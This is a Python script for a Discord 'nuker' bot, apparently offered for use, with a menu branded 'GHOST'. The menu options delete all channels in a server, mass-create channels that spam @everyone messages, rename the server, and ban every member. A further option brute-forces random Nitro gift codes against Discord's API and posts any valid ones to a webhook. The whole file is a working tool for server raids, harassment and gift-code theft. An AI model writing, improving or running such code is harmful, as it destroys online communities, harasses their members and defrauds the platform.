import discord
from discord.ext import commands
import asyncio
import os
import requests
import random
import string
from colorama import init, Fore

init(autoreset=True)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

gradient = [
    "\033[38;5;255m",
    "\033[38;5;250m",
    "\033[38;5;247m",
    "\033[38;5;244m",
    "\033[38;5;241m",
    "\033[38;5;240m",
]
reset = "\033[0m"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def main_menu():
    clear()
    print()
    print(f"{gradient[0]}                                           _____   __ __  ____    ____ ______{reset}")
    print(f"{gradient[1]}                                          / ___/  / // / / __ \\  / __//_  __/    dc: 8dfh        {reset}")  
    print(f"{gradient[1]}                                         / (_ /  / _  / / /_/ / _\\ \\   / /   {reset}") 
    print(f"{gradient[2]}                                         \\___/  /_//_/  \\____/ /___/  /_/    {reset}")
    print()                                               
    print(f"{gradient[3]}                                    --------------------------------------------{reset}")
    print()
    print(f"{gradient[0]}                     [01] > Delete Channels     [03] > Rename Server     [05] > Nitro Generator{reset}")
    print(f"{gradient[1]}                     [02] > Create Channels     [04] > Ban All Members   [06] > Exit{reset}") 
    print()

def show_menu():
    main_menu()
    return input(f"{gradient[0]}[ghost@MENU] > {reset}")

def generate_nitro_code():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

@bot.event
async def on_ready():
    guild = bot.guilds[0]

    while True:
        escolha = show_menu()

        if escolha == "01":
            print(f"{gradient[0]}\n[ghost@Deleting] > Channels...\n{reset}")
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f"{Fore.GREEN}Channel Deleted | {channel.name}")
                except:
                    pass
            input(f"\n{gradient[0]}Press Enter to return...{reset}")

        elif escolha == "02":
            try:
                print()
                qtd = int(input(f"{gradient[0]}[ghost@Amount] > {reset}"))
                print()
                nome = input(f"{gradient[0]}[ghost@Name] > {reset}")
                print()
                mensagem = input(f"{gradient[0]}[ghost@Message] > {reset}")
                print()
                repeticoes = int(input(f"{gradient[0]}[ghost@Repeat] > {reset}"))
                print()

                for i in range(qtd):
                    channel_name = f"{nome}-{i+1}"
                    channel = await guild.create_text_channel(channel_name)
                    print(f"{Fore.GREEN}Channel Created | {channel_name}")
                    for _ in range(repeticoes):
                        msg = await channel.send(f"@everyone {mensagem}")
                        print(f"{Fore.GREEN}Message Successful | {msg.id} | ghost@menu")
                    print()

            except Exception as e:
                print(f"Error: {e}")
            input(f"\n{gradient[0]}Press Enter to return...{reset}")

        elif escolha == "03":
            print()
            novo_nome = input(f"{gradient[0]}[ghost@NewName] > {reset}")
            try:
                await guild.edit(name=novo_nome)
                print()
                print(f"{Fore.GREEN}Server Renamed | {novo_nome}")
            except Exception as e:
                print(f"Error: {e}")
            input(f"\n{gradient[0]}Press Enter to return...{reset}")

        elif escolha == "04":
            print()
            print(f"\n{gradient[0]}[ghost@Banning] > All members...{reset}\n")
            for member in guild.members:
                try:
                    await member.ban(reason="Nuked")
                    print(f"{Fore.GREEN}Member Banned | {member.name}")
                except:
                    pass
            input(f"\n{gradient[0]}Press Enter to return...{reset}")

        elif escolha == "05":
            print()
            webhook_url = input(f"{gradient[0]}[ghost@Webhook] > {reset}")
            print()
            quantidade = int(input(f"{gradient[0]}[ghost@ValidNitros] > {reset}"))
            print(f"\n{gradient[0]}[ghost@Searching] > Looking for {quantidade} valid codes...{reset}\n")

            encontrados = 0

            while encontrados < quantidade:
                code = generate_nitro_code()
                url = f"https://discord.gift/{code}"

                response = requests.get(
                    f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
                )

                if response.status_code == 200:
                    print(f"{Fore.GREEN}Nitro Sent | {url} | ghost@NITRO")
                    requests.post(webhook_url, json={"content": f"🎁 Nitro Found! {url}"})
                    encontrados += 1
                else:
                    print(f"{Fore.RED}Invalid Code | {url} | {response.status_code}")

            input(f"\n{gradient[0]}Press Enter to return...{reset}")

        elif escolha == "06":
            print()
            print("Exiting...")
            await bot.close()
            break

        else:
            input(f"\n{gradient[0]}Invalid option. Press Enter...{reset}")

if __name__ == "__main__":
    clear()
    main_menu()
    token = input(f"{gradient[0]}[ghost@BotToken] > {reset}")
    try:
        bot.run(token, log_handler=None)
    except Exception as e:
        print(f"{Fore.RED}Failed to run bot: {e}")
